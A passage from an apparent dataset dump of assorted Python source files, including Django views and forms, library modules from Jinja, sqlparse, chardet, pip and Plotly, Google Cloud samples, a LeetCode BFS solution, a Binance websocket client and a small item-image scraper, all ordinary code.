    search = forms.CharField(max_length=100, widget=forms.TextInput(attrs={'placeholder': 'Type something or someone to search for ...'}))

class UpdateProfileForm(forms.Form):
    first_name = forms.CharField(max_length=100, required=False)
    last_name = forms.CharField(max_length=100, required=False)
    profile_image = forms.ImageField(required=False)
    remove_profile_image = forms.BooleanField(required=False)
    profile_cover_photo = forms.ImageField(required=False)
    remove_cover_photo = forms.BooleanField(required=False)
    profile_bio = forms.CharField(max_length=500, required=False, widget=forms.Textarea(attrs={'placeholder': 'Write something about yourself ...'}))"
JD153	JD153-views.py	"from django.contrib.messages.views import SuccessMessageMixin
from django.views.generic import CreateView, ListView, UpdateView, DeleteView
from django.urls import reverse_lazy
from .forms import HouseForm
from .mixins import CountFlatsMixin, ImageResizeBeforeMixin
from .models import House
from django.utils.translation import gettext_lazy as _
from ..mixins import LoginRequiredMixinCustom


class HouseCreateView(LoginRequiredMixinCustom, ImageResizeBeforeMixin,
                      SuccessMessageMixin, CreateView):
    form_class = HouseForm
    template_name = ""house/create.html""
    success_url = reverse_lazy('house_list')
    extra_context = {
        'header': _('Create house'),
        'button_title': _('Create'),
        'langs': House.get_lang_list_qs(),
    }
    success_message = _('House created successfully')


class HouseUpdateView(LoginRequiredMixinCustom, ImageResizeBeforeMixin,
                      SuccessMessageMixin, UpdateView):
    model = House
    form_class = HouseForm
    template_name = ""house/create.html""
    success_url = reverse_lazy('house_list')
    extra_context = {
        'header': _('Update house'),
        'button_title': _('Update'),
        'langs': House.get_lang_list_qs(),
    }
    success_message = _('House updated successfully')


class HouseListView(LoginRequiredMixinCustom, CountFlatsMixin, ListView):
    model = House
    template_name = ""house/list.html""
    extra_context = {
        'remove_title': _('remove'),
    }
    ordering = 'address'


class HouseDeleteView(LoginRequiredMixinCustom,
                      SuccessMessageMixin, DeleteView):
    model = House
    template_name = ""house/delete.html""
    success_url = reverse_lazy('house_list')
    extra_context = {
        'header': _('Remove house'),
        'button_title': _('Remove '),
        'message': _('Are you sure delete house '),
    }
    success_message = _('House deleted successfully')"
JD259	JD259-omci_entities.py	"# Copyright 2018-present Tellabs, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
"""""" Tellabs vendor-specific OMCI Entities""""""

import inspect
import structlog
import sys

from scapy.fields import ShortField, IntField, ByteField, StrFixedLenField
from voltha.extensions.omci.omci_entities import EntityClassAttribute, \
    AttributeAccess, OmciNullPointer, EntityOperations, EntityClass

log = structlog.get_logger()

# abbreviations
ECA = EntityClassAttribute
AA = AttributeAccess
OP = EntityOperations

#################################################################################
# entity class lookup table from entity_class values
_onu_entity_classes_name_map = dict(
    inspect.getmembers(sys.modules[__name__], lambda o:
    inspect.isclass(o) and issubclass(o, EntityClass) and o is not EntityClass)
)
_onu_custom_entity_classes = [c for c in _onu_entity_classes_name_map.itervalues()]
_onu_custom_entity_id_to_class_map = dict()


def onu_custom_me_entities():
    log.info('onu_custom_me_entities')

    if len(_onu_custom_entity_id_to_class_map) == 0:
        for entity_class in _onu_custom_entity_classes:
            log.info('adding-custom-me', class_id=entity_class.class_id)
            assert entity_class.class_id not in _onu_custom_entity_id_to_class_map, \
                ""Class ID '{}' already exists in the class map"".format(entity_class.class_id)
            _onu_custom_entity_id_to_class_map[entity_class.class_id] = entity_class

    log.info('onu_custom_me_entities', map=_onu_custom_entity_id_to_class_map)
    return _onu_custom_entity_id_to_class_map
"
JD152	JD152-views.py	"from django.contrib.messages.views import SuccessMessageMixin
from django.urls import reverse_lazy
from django.views.generic import ListView
from django.views.generic.edit import CreateView, UpdateView, DeleteView
from .forms import FlatForm
from .mixins import HousesAddMixin, SeveralInstanceCreateMixin
from .models import Flat
from django.utils.translation import gettext_lazy as _

from ..mixins import LoginRequiredMixinCustom


class FlatCreateView(LoginRequiredMixinCustom, SeveralInstanceCreateMixin,
                     SuccessMessageMixin, CreateView):
    form_class = FlatForm
    template_name = ""flat/create.html""
    success_url = reverse_lazy('flat_list')
    login_url = reverse_lazy(""user_login"")
    extra_context = {
        'header': _('Create flat'),
        'button_title': _('Create'),
    }
    success_message = _('Flat created successfully')


class FlatListView(LoginRequiredMixinCustom, HousesAddMixin, ListView):
    model = Flat
    template_name = ""flat/list.html""
    extra_context = {
        ""remove_title"": _(""remove"")
    }


class FlatUpdateView(LoginRequiredMixinCustom,
                     SuccessMessageMixin, UpdateView):
    model = Flat
    form_class = FlatForm
    template_name = ""flat/create.html""
    success_url = reverse_lazy('flat_list')
    extra_context = {
        'header': _('Update Flat'),
        'button_title': _('Update'),
    }
    success_message = _('Flat updated successfully')


class FlatDeleteView(LoginRequiredMixinCustom,
                     SuccessMessageMixin, DeleteView):
    model = Flat
    template_name = ""flat/delete.html""
    success_url = reverse_lazy('flat_list')
    extra_context = {
        'header': _('Remove flat'),
        'button_title': _('Remove '),
        'message': _('Are you sure delete flat '),
    }
    success_message = _('Flat deleted successfully')"
JY453	JY453-common.py	"from __future__ import annotations

from pandas import (
    DataFrame,
    concat,
)


def _check_mixed_float(df, dtype=None):
    # float16 are most likely to be upcasted to float32
    dtypes = {""A"": ""float32"", ""B"": ""float32"", ""C"": ""float16"", ""D"": ""float64""}
    if isinstance(dtype, str):
        dtypes = {k: dtype for k, v in dtypes.items()}
    elif isinstance(dtype, dict):
        dtypes.update(dtype)
    if dtypes.get(""A""):
        assert df.dtypes[""A""] == dtypes[""A""]
    if dtypes.get(""B""):
        assert df.dtypes[""B""] == dtypes[""B""]
    if dtypes.get(""C""):
        assert df.dtypes[""C""] == dtypes[""C""]
    if dtypes.get(""D""):
        assert df.dtypes[""D""] == dtypes[""D""]


def _check_mixed_int(df, dtype=None):
    dtypes = {""A"": ""int32"", ""B"": ""uint64"", ""C"": ""uint8"", ""D"": ""int64""}
    if isinstance(dtype, str):
        dtypes = {k: dtype for k, v in dtypes.items()}
    elif isinstance(dtype, dict):
        dtypes.update(dtype)
    if dtypes.get(""A""):
        assert df.dtypes[""A""] == dtypes[""A""]
    if dtypes.get(""B""):
        assert df.dtypes[""B""] == dtypes[""B""]
    if dtypes.get(""C""):
        assert df.dtypes[""C""] == dtypes[""C""]
    if dtypes.get(""D""):
        assert df.dtypes[""D""] == dtypes[""D""]


def zip_frames(frames: list[DataFrame], axis: int = 1) -> DataFrame:
    """"""
    take a list of frames, zip them together under the
    assumption that these all have the first frames' index/columns.

    Returns
    -------
    new_frame : DataFrame
    """"""
    if axis == 1:
        columns = frames[0].columns
        zipped = [f.loc[:, c] for c in columns for f in frames]
        return concat(zipped, axis=1)
    else:
        index = frames[0].index
        zipped = [f.loc[i, :] for i in index for f in frames]
        return DataFrame(zipped)"
JD44	JD44-__init__.py	"""""""Jinja is a template engine written in pure Python. It provides a
non-XML syntax that supports inline expressions and an optional
sandboxed environment.
""""""
from .bccache import BytecodeCache as BytecodeCache
from .bccache import FileSystemBytecodeCache as FileSystemBytecodeCache
from .bccache import MemcachedBytecodeCache as MemcachedBytecodeCache
from .environment import Environment as Environment
from .environment import Template as Template
from .exceptions import TemplateAssertionError as TemplateAssertionError
from .exceptions import TemplateError as TemplateError
from .exceptions import TemplateNotFound as TemplateNotFound
from .exceptions import TemplateRuntimeError as TemplateRuntimeError
from .exceptions import TemplatesNotFound as TemplatesNotFound
from .exceptions import TemplateSyntaxError as TemplateSyntaxError
from .exceptions import UndefinedError as UndefinedError
from .loaders import BaseLoader as BaseLoader
from .loaders import ChoiceLoader as ChoiceLoader
from .loaders import DictLoader as DictLoader
from .loaders import FileSystemLoader as FileSystemLoader
from .loaders import FunctionLoader as FunctionLoader
from .loaders import ModuleLoader as ModuleLoader
from .loaders import PackageLoader as PackageLoader
from .loaders import PrefixLoader as PrefixLoader
from .runtime import ChainableUndefined as ChainableUndefined
from .runtime import DebugUndefined as DebugUndefined
from .runtime import make_logging_undefined as make_logging_undefined
from .runtime import StrictUndefined as StrictUndefined
from .runtime import Undefined as Undefined
from .utils import clear_caches as clear_caches
from .utils import is_undefined as is_undefined
from .utils import pass_context as pass_context
from .utils import pass_environment as pass_environment
from .utils import pass_eval_context as pass_eval_context
from .utils import select_autoescape as select_autoescape

__version__ = ""3.1.2"""
JY538	JY538-deconstruct.py	"from importlib import import_module

from django.utils.version import get_docs_version


def deconstructible(*args, path=None):
    """"""
    Class decorator that allows the decorated class to be serialized
    by the migrations subsystem.

    The `path` kwarg specifies the import path.
    """"""
    def decorator(klass):
        def __new__(cls, *args, **kwargs):
            # We capture the arguments to make returning them trivial
            obj = super(klass, cls).__new__(cls)
            obj._constructor_args = (args, kwargs)
            return obj

        def deconstruct(obj):
            """"""
            Return a 3-tuple of class import path, positional arguments,
            and keyword arguments.
            """"""
            # Fallback version
            if path:
                module_name, _, name = path.rpartition('.')
            else:
                module_name = obj.__module__
                name = obj.__class__.__name__
            # Make sure it's actually there and not an inner class
            module = import_module(module_name)
            if not hasattr(module, name):
                raise ValueError(
                    ""Could not find object %s in %s.\n""
                    ""Please note that you cannot serialize things like inner ""
                    ""classes. Please move the object into the main module ""
                    ""body to use migrations.\n""
                    ""For more information, see ""
                    ""https://docs.djangoproject.com/en/%s/topics/migrations/#serializing-values""
                    % (name, module_name, get_docs_version()))
            return (
                path or '%s.%s' % (obj.__class__.__module__, name),
                obj._constructor_args[0],
                obj._constructor_args[1],
            )

        klass.__new__ = staticmethod(__new__)
        klass.deconstruct = deconstruct

        return klass

    if not args:
        return decorator
    return decorator(*args)"
JY109	JY109-mbcsgroupprober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is Mozilla Universal charset detector code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 2001
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#   Shy Shalom - original C code
#   Proofpoint, Inc.
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .charsetgroupprober import CharSetGroupProber
from .utf8prober import UTF8Prober
from .sjisprober import SJISProber
from .eucjpprober import EUCJPProber
from .gb2312prober import GB2312Prober
from .euckrprober import EUCKRProber
from .cp949prober import CP949Prober
from .big5prober import Big5Prober
from .euctwprober import EUCTWProber


class MBCSGroupProber(CharSetGroupProber):
    def __init__(self, lang_filter=None):
        super(MBCSGroupProber, self).__init__(lang_filter=lang_filter)
        self.probers = [
            UTF8Prober(),
            SJISProber(),
            EUCJPProber(),
            GB2312Prober(),
            EUCKRProber(),
            CP949Prober(),
            Big5Prober(),
            EUCTWProber(),
        ]
        self.reset()"
JD236	JD236-__init__.py	"#
# Copyright (C) 2009-2020 the sqlparse authors and contributors
# <see AUTHORS file>
#
# This module is part of python-sqlparse and is released under
# the BSD License: https://opensource.org/licenses/BSD-3-Clause

""""""Parse SQL statements.""""""

# Setup namespace
from sqlparse import sql
from sqlparse import cli
from sqlparse import engine
from sqlparse import tokens
from sqlparse import filters
from sqlparse import formatter


__version__ = '0.4.3'
__all__ = ['engine', 'filters', 'formatter', 'sql', 'tokens', 'cli']


def parse(sql, encoding=None):
    """"""Parse sql and return a list of statements.

    :param sql: A string containing one or more SQL statements.
    :param encoding: The encoding of the statement (optional).
    :returns: A tuple of :class:`~sqlparse.sql.Statement` instances.
    """"""
    return tuple(parsestream(sql, encoding))


def parsestream(stream, encoding=None):
    """"""Parses sql statements from file-like object.

    :param stream: A file-like object.
    :param encoding: The encoding of the stream contents (optional).
    :returns: A generator of :class:`~sqlparse.sql.Statement` instances.
    """"""
    stack = engine.FilterStack()
    stack.enable_grouping()
    return stack.run(stream, encoding)


def format(sql, encoding=None, **options):
    """"""Format *sql* according to *options*.

    Available options are documented in :ref:`formatting`.

    In addition to the formatting options this function accepts the
    keyword ""encoding"" which determines the encoding of the statement.

    :returns: The formatted SQL statement as string.
    """"""
    stack = engine.FilterStack()
    options = formatter.validate_options(options)
    stack = formatter.build_filter_stack(stack, options)
    stack.postprocess.append(filters.SerializerUnicode())
    return ''.join(stack.run(sql, encoding))


def split(sql, encoding=None):
    """"""Split *sql* into single statements.

    :param sql: A string containing one or more SQL statements.
    :param encoding: The encoding of the statement (optional).
    :returns: A list of strings.
    """"""
    stack = engine.FilterStack()
    return [str(stmt).strip() for stmt in stack.run(sql, encoding)]"
JY399	JY399-_insidetextfont.py	"import _plotly_utils.basevalidators


class InsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""insidetextfont"", parent_name=""funnel"", **kwargs):
        super(InsidetextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Insidetextfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD425	JD425-994. 腐烂的橘子(BFS).py	"class Solution(object):
    def orangesRotting(self, grid):
        """"""
        :type grid: List[List[int]]
        :rtype: int
        """"""
        if not grid or len(grid) == 0:
            return -1

        dirs = [[-1, 0], [1, 0], [0, -1], [0, 1]]

        lr = len(grid)
        lc = len(grid[0])

        # 因为腐烂一次
        res = -1
        queue = []

        # count是用来记录存不存在新鲜的橘子，假如说没有新鲜的橘子，那么直接返回0
        # 这是用来处理 corner case的
        count = 0

        for i in range(lr):
            for j in range(lc):
                # 有腐烂的橘子，我们待会就要从腐烂的橘子出发，做BFS
                if grid[i][j] == 2:
                    queue.append([i, j])
                # 解决corner case
                elif grid[i][j] == 1:
                    count += 1

        if count == 0:
            return 0

        while queue:
            lenqueue = len(queue)

            for i in range(lenqueue):
                point = queue.pop(0)
                row = point[0]
                col = point[1]

                for dir in dirs:
                    r = row + dir[0]
                    c = col + dir[1]
                    if r >= 0 and c >= 0 and r < lr and c < lc and grid[r][c] == 1:
                        # 把新鲜橘子腐烂掉
                        grid[r][c] = 2
                        queue.append([r, c])
            res += 1

        # 假如说我们已经腐烂完了，但是里面还有新鲜的橘子，那么说明无法全部腐烂完成
        for row in grid:
            if 1 in row:
                return -1

        # 否则直接返回正确结果
        return res

""""""
时间复杂度：O(nm)
即进行一次广度优先搜索的时间，其中 n=grid.length, m=grid[0].length
空间复杂度：O(nm)
广度优先搜索中队列里存放的状态最多不会超过 nm 个，最多需要O(nm)的空间，所以最后的空间复杂度为O(nm)。


本题基本上和289使用的是同一个解题模版，只不过是根据题目的条件不同，来进行略微的调整
"""""""
JY198	JY198-script-binance-webhooks.py	"import json
import time
from threading import Thread
from websocket import create_connection, WebSocketConnectionClosedException


def main():
    ws = None
    thread = None
    thread_running = False
    thread_keepalive = None

    def websocket_thread():
        global ws

        ws = create_connection(""wss://stream.binance.com:9443/ws"")
        ws.send(
            json.dumps(
                {
                    ""method"": ""SUBSCRIBE"",
                    ""params"": [
                        ""btcusdt@miniTicker"",
                        ""btcusdt@kline_1m"",
                        ""btcusdt@kline_5m"",
                        ""btcusdt@kline_15m"",
                        ""btcusdt@kline_1h"",
                        ""btcusdt@kline_6h"",
                        ""btcusdt@kline_1d"",
                    ],
                    ""id"": 1,
                }
            )
        )

        thread_keepalive.start()
        while not thread_running:
            try:
                data = ws.recv()
                if data != """":
                    msg = json.loads(data)
                else:
                    msg = {}
            except ValueError as e:
                print(e)
                print(""{} - data: {}"".format(e, data))
            except Exception as e:
                print(e)
                print(""{} - data: {}"".format(e, data))
            else:
                if ""result"" not in msg:
                    print(msg)

        try:
            if ws:
                ws.close()
        except WebSocketConnectionClosedException:
            pass
        finally:
            thread_keepalive.join()

    def websocket_keepalive(interval=30):
        global ws
        while ws.connected:
            ws.ping(""keepalive"")
            time.sleep(interval)

    thread = Thread(target=websocket_thread)
    thread_keepalive = Thread(target=websocket_keepalive)
    thread.start()


if __name__ == ""__main__"":
    main()"
JY178	JY178-_util.py	"# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See LICENSE in the project root
# for license information.

import contextlib
import os


@contextlib.contextmanager
def cwd(dirname):
    """"""A context manager for operating in a different directory.""""""
    orig = os.getcwd()
    os.chdir(dirname)
    try:
        yield orig
    finally:
        os.chdir(orig)


def iter_all_files(root, prune_dir=None, exclude_file=None):
    """"""Yield (dirname, basename, filename) for each file in the tree.

    This is an alternative to os.walk() that flattens out the tree and
    with filtering.
    """"""
    pending = [root]
    while pending:
        dirname = pending.pop(0)
        for result in _iter_files(dirname, pending, prune_dir, exclude_file):
            yield result


def iter_tree(root, prune_dir=None, exclude_file=None):
    """"""Yield (dirname, files) for each directory in the tree.

    The list of files is actually a list of (basename, filename).

    This is an alternative to os.walk() with filtering.""""""
    pending = [root]
    while pending:
        dirname = pending.pop(0)
        files = []
        for _, b, f in _iter_files(dirname, pending, prune_dir, exclude_file):
            files.append((b, f))
        yield dirname, files


def _iter_files(dirname, subdirs, prune_dir, exclude_file):
    for basename in os.listdir(dirname):
        filename = os.path.join(dirname, basename)
        if os.path.isdir(filename):
            if prune_dir is not None and prune_dir(dirname, basename):
                continue
            subdirs.append(filename)
        else:
            # TODO: Use os.path.isfile() to narrow it down?
            if exclude_file is not None and exclude_file(dirname, basename):
                continue
            yield dirname, basename, filename"
JY333	JY333-sample.py	"from rx.core import Observable, AnonymousObservable
from rx.disposables import CompositeDisposable
from rx.concurrency import timeout_scheduler
from rx.internal import extensionmethod


def sample_observable(source, sampler):

    def subscribe(observer):
        at_end = [None]
        has_value = [None]
        value = [None]

        def sample_subscribe(x=None):
            if has_value[0]:
                has_value[0] = False
                observer.on_next(value[0])

            if at_end[0]:
                observer.on_completed()

        def on_next(new_value):
            has_value[0] = True
            value[0] = new_value

        def on_completed():
            at_end[0] = True

        return CompositeDisposable(
            source.subscribe(on_next, observer.on_error, on_completed),
            sampler.subscribe(sample_subscribe, observer.on_error, sample_subscribe)
        )
    return AnonymousObservable(subscribe)


@extensionmethod(Observable, alias=""throttle_last"")
def sample(self, interval=None, sampler=None, scheduler=None):
    """"""Samples the observable sequence at each interval.

    1 - res = source.sample(sample_observable) # Sampler tick sequence
    2 - res = source.sample(5000) # 5 seconds
    2 - res = source.sample(5000, rx.scheduler.timeout) # 5 seconds

    Keyword arguments:
    source -- Source sequence to sample.
    interval -- Interval at which to sample (specified as an integer
        denoting milliseconds).
    scheduler -- [Optional] Scheduler to run the sampling timer on. If not
        specified, the timeout scheduler is used.

    Returns sampled observable sequence.
    """"""

    scheduler = scheduler or timeout_scheduler
    if interval is not None:
        return sample_observable(self, Observable.interval(interval, scheduler=scheduler))

    return sample_observable(self, sampler)"
JD101	JD101-mbcsgroupprober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is Mozilla Universal charset detector code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 2001
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#   Shy Shalom - original C code
#   Proofpoint, Inc.
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .big5prober import Big5Prober
from .charsetgroupprober import CharSetGroupProber
from .cp949prober import CP949Prober
from .enums import LanguageFilter
from .eucjpprober import EUCJPProber
from .euckrprober import EUCKRProber
from .euctwprober import EUCTWProber
from .gb2312prober import GB2312Prober
from .johabprober import JOHABProber
from .sjisprober import SJISProber
from .utf8prober import UTF8Prober


class MBCSGroupProber(CharSetGroupProber):
    def __init__(self, lang_filter: LanguageFilter = LanguageFilter.NONE) -> None:
        super().__init__(lang_filter=lang_filter)
        self.probers = [
            UTF8Prober(),
            SJISProber(),
            EUCJPProber(),
            GB2312Prober(),
            EUCKRProber(),
            CP949Prober(),
            Big5Prober(),
            EUCTWProber(),
            JOHABProber(),
        ]
        self.reset()"
JY311	JY311-_textfont.py	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""pie"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD438	JD438-vision_object_detection_create_model.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


def create_model(project_id, dataset_id, display_name):
    """"""Create a model.""""""
    # [START automl_vision_object_detection_create_model]
    from google.cloud import automl

    # TODO(developer): Uncomment and set the following variables
    # project_id = ""YOUR_PROJECT_ID""
    # dataset_id = ""YOUR_DATASET_ID""
    # display_name = ""your_models_display_name""

    client = automl.AutoMlClient()

    # A resource that represents Google Cloud Platform location.
    project_location = f""projects/{project_id}/locations/us-central1""
    # Leave model unset to use the default base model provided by Google
    # train_budget_milli_node_hours: The actual train_cost will be equal or
    # less than this value.
    # https://cloud.google.com/automl/docs/reference/rpc/google.cloud.automl.v1#imageobjectdetectionmodelmetadata
    metadata = automl.ImageObjectDetectionModelMetadata(
        train_budget_milli_node_hours=24000
    )
    model = automl.Model(
        display_name=display_name,
        dataset_id=dataset_id,
        image_object_detection_model_metadata=metadata,
    )

    # Create a model with the model metadata in the region.
    response = client.create_model(parent=project_location, model=model)

    print(""Training operation name: {}"".format(response.operation.name))
    print(""Training started..."")
    # [END automl_vision_object_detection_create_model]
    return response"
JD19	JD19-selection_prefs.py	"from typing import Optional

from pip._internal.models.format_control import FormatControl


class SelectionPreferences:
    """"""
    Encapsulates the candidate selection preferences for downloading
    and installing files.
    """"""

    __slots__ = ['allow_yanked', 'allow_all_prereleases', 'format_control',
                 'prefer_binary', 'ignore_requires_python']

    # Don't include an allow_yanked default value to make sure each call
    # site considers whether yanked releases are allowed. This also causes
    # that decision to be made explicit in the calling code, which helps
    # people when reading the code.
    def __init__(
        self,
        allow_yanked: bool,
        allow_all_prereleases: bool = False,
        format_control: Optional[FormatControl] = None,
        prefer_binary: bool = False,
        ignore_requires_python: Optional[bool] = None,
    ):
        # type: (...) -> None
        """"""Create a SelectionPreferences object.

        :param allow_yanked: Whether files marked as yanked (in the sense
            of PEP 592) are permitted to be candidates for install.
        :param format_control: A FormatControl object or None. Used to control
            the selection of source packages / binary packages when consulting
            the index and links.
        :param prefer_binary: Whether to prefer an old, but valid, binary
            dist over a new source dist.
        :param ignore_requires_python: Whether to ignore incompatible
            ""Requires-Python"" values in links. Defaults to False.
        """"""
        if ignore_requires_python is None:
            ignore_requires_python = False

        self.allow_yanked = allow_yanked
        self.allow_all_prereleases = allow_all_prereleases
        self.format_control = format_control
        self.prefer_binary = prefer_binary
        self.ignore_requires_python = ignore_requires_python"
JD67	JD67-RLDataWebScraper3.py	"# image_uri extractor
import requests
from bs4 import BeautifulSoup
import time

import json

api_url = 'http://127.0.0.1:3000/items'

# Get the current list of daily items from the API
response = requests.get(api_url)
items = response.json()

updated_count = 0
skipped_count = 0

last_attempted_item = 0

# Go through each item and update the image URI
for item in items:
    if item['id'] < 57722:
        continue
    if last_attempted_item is not None and item['id'] < last_attempted_item:
        continue
    if item['valid_status'] is True:
        skipped_count += 1
        continue
    while True:
        try:
            search_url = f""https://rl.insider.gg/en/pc/search?q={item['name'].replace(' ', '+')}""
            search_response = requests.get(search_url)
            search_html = search_response.text
            search_soup = BeautifulSoup(search_html, 'html.parser')
            search_items = search_soup.find_all('div', class_='item')
            for search_item in search_items:
                if search_item.find('span', class_='itemName').text.lower() == item['name'].lower():
                    img_uri = search_item['data-uri']
                    if ""import/import"" in img_uri:
                        img_uri = img_uri.replace(""import/import"", ""import"")
                    item['image_uri'] = img_uri
                    patch_response = requests.patch(api_url+'/'+str(item['id']), json={'image_uri': img_uri})
                    print(f""{item['id']} Image URI updated"")
                    updated_count += 1
                    break
            else:
                print(f""{item['id']} No image URI found"")
                skipped_count += 1
            last_attempted_item = item['id']
            break
        except Exception as e:
            print(f""Error updating item {item['id']}: {e}"")
            print(f""Retrying in 5 minutes..."")
            time.sleep(5 * 60)
            continue

print(f""Updated {updated_count} items"")
print(f""Skipped {skipped_count} items"")"
JY26	JY26-typing.py	"""""""Helpers for use with type annotation.

Use the empty classes in this module when annotating the types of Pyrsistent
objects, instead of using the actual collection class.

For example,

    from pyrsistent import pvector
    from pyrsistent.typing import PVector

    myvector: PVector[str] = pvector(['a', 'b', 'c'])

""""""
from __future__ import absolute_import

try:
    from typing import Container
    from typing import Hashable
    from typing import Generic
    from typing import Iterable
    from typing import Mapping
    from typing import Sequence
    from typing import Sized
    from typing import TypeVar

    __all__ = [
        'CheckedPMap',
        'CheckedPSet',
        'CheckedPVector',
        'PBag',
        'PDeque',
        'PList',
        'PMap',
        'PSet',
        'PVector',
    ]

    T = TypeVar('T')
    KT = TypeVar('KT')
    VT = TypeVar('VT')

    class CheckedPMap(Mapping[KT, VT], Hashable):
        pass

    # PSet.add and PSet.discard have different type signatures than that of Set.
    class CheckedPSet(Generic[T], Hashable):
        pass

    class CheckedPVector(Sequence[T], Hashable):
        pass

    class PBag(Container[T], Iterable[T], Sized, Hashable):
        pass

    class PDeque(Sequence[T], Hashable):
        pass

    class PList(Sequence[T], Hashable):
        pass

    class PMap(Mapping[KT, VT], Hashable):
        pass

    # PSet.add and PSet.discard have different type signatures than that of Set.
    class PSet(Generic[T], Hashable):
        pass

    class PVector(Sequence[T], Hashable):
        pass

    class PVectorEvolver(Generic[T]):
        pass

    class PMapEvolver(Generic[KT, VT]):
        pass

    class PSetEvolver(Generic[T]):
        pass
except ImportError:
    pass"
JD467	JD467-main.py	"# Copyright 2016 Google Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

""""""
Sample Google App Engine application that demonstrates using the Users API

For more information about App Engine, see README.md under /appengine.
""""""

# [START all]

from google.appengine.api import users
import webapp2


class MainPage(webapp2.RequestHandler):
    def get(self):
        # [START user_details]
        user = users.get_current_user()
        if user:
            nickname = user.nickname()
            logout_url = users.create_logout_url('/')
            greeting = 'Welcome, {}! (<a href=""{}"">sign out</a>)'.format(
                nickname, logout_url)
        else:
            login_url = users.create_login_url('/')
            greeting = '<a href=""{}"">Sign in</a>'.format(login_url)
        # [END user_details]
        self.response.write(
            '<html><body>{}</body></html>'.format(greeting))


class AdminPage(webapp2.RequestHandler):
    def get(self):
